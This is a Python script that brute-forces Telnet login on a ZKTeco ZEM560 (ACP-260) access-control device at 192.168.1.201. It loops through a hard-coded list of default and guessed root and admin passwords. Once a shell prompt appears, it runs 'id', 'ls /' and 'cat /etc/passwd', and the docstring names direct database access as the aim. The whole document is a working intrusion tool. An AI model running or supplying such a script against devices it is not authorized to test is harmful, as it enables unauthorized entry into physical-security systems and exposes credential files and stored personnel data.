"""
Brute-force ZKTeco ZEM560 Telnet login with known default credentials.
Device is running Linux on MIPS — if we get in, we can access the database directly.

Target: ACP-260 (ZEM560) at 192.168.1.201:23
"""

import socket
import time

DEVICE_IP = "192.168.1.201"
TIMEOUT = 5

# Known ZKTeco/ZEM default credentials
CREDENTIALS = [
    ("root", "sola"),
    ("root", "root"),
    ("root", "zksoftware"),
    ("root", "zktco"),
    ("root", "ZKTeco"),
    ("root", "zk123"),
    ("root", "zktest"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "zksoftware"),
    ("admin", "zktco"),
    ("admin", "ZKTeco"),
    ("admin", "sola"),
    ("administrator", " administrator"),
    ("guest", "guest"),
    ("user", "user"),
    ("zk", "zk"),
    ("test", "test"),
    ("service", "service"),
    ("manager", "manager"),
    ("root", "pass"),
    ("root", "password"),
    ("root", "mips"),
    ("root", "zem500"),
    ("root", "zem560"),
    ("root", "treckle"),
    ("root", "ZEM560"),
    ("root", "acp260"),
    ("root", "ACP260"),
]


def try_login(username, password):
    """Try one set of credentials. Returns True if login succeeded."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)

    try:
        sock.connect((DEVICE_IP, 23))

        # Read banner
        time.sleep(1)
        try:
            sock.recv(4096)  # banner
        except socket.timeout:
            pass

        # Send username
        sock.send(f"{username}\r\n".encode())
        time.sleep(0.5)
        resp = b""
        try:
            resp = sock.recv(4096)
        except socket.timeout:
            pass

        # Check if we got password prompt
        if b"Password" not in resp and b"assword" not in resp:
            sock.close()
            return False, "No password prompt"

        # Send password
        sock.send(f"{password}\r\n".encode())
        time.sleep(1)
        resp = b""
        try:
            resp = sock.recv(4096)
        except socket.timeout:
            pass

        resp_text = resp.decode('ascii', errors='replace')

        if "Login incorrect" in resp_text:
            sock.close()
            return False, "Login incorrect"
        elif "login:" in resp_text.lower() and "incorrect" not in resp_text:
            sock.close()
            return False, "Back to login"
        elif "$" in resp_text or "#" in resp_text or ">" in resp_text:
            # Looks like a shell prompt!
            print(f"  *** SUCCESS! Got shell prompt: {resp_text.strip()}")
            # Try a command
            sock.send(b"id\r\n")
            time.sleep(0.5)
            try:
                id_out = sock.recv(4096).decode('ascii', errors='replace')
                print(f"  id: {id_out.strip()}")
            except:
                pass

            sock.send(b"ls /\r\n")
            time.sleep(0.5)
            try:
                ls_out = sock.recv(4096).decode('ascii', errors='replace')
                print(f"  ls /: {ls_out.strip()}")
            except:
                pass

            sock.send(b"cat /etc/passwd\r\n")
            time.sleep(0.5)
            try:
                pwd_out = sock.recv(4096).decode('ascii', errors='replace')
                print(f"  /etc/passwd: {pwd_out.strip()}")
            except:
                pass

            sock.close()
            return True, resp_text
        else:
            # Unknown response — might be success
            print(f"  Unknown response for {username}/{password}: {resp_text[:200]}")
            sock.close()
            return False, f"Unknown: {resp_text[:100]}"

    except Exception as e:
        try:
            sock.close()
        except:
            pass
        return False, f"Error: {e}"


print("=" * 60)
print(f"ZKTeco ZEM560 LOGIN BRUTE FORCE — {DEVICE_IP}:23")
print(f"Trying {len(CREDENTIALS)} credential combinations")
print("=" * 60)

for username, password in CREDENTIALS:
    pw_display = password if password else "(empty)"
    print(f"  Trying {username} / {pw_display} ... ", end="", flush=True)

    success, detail = try_login(username, password)

    if success:
        print(f"SUCCESS!")
        print(f"\n{'=' * 60}")
        print(f"  CREDENTIALS FOUND: {username} / {pw_display}")
        print(f"{'=' * 60}")
        break
    else:
        print(f"failed ({detail})")

    time.sleep(0.3)  # Don't hammer the device

print("\nDone.")
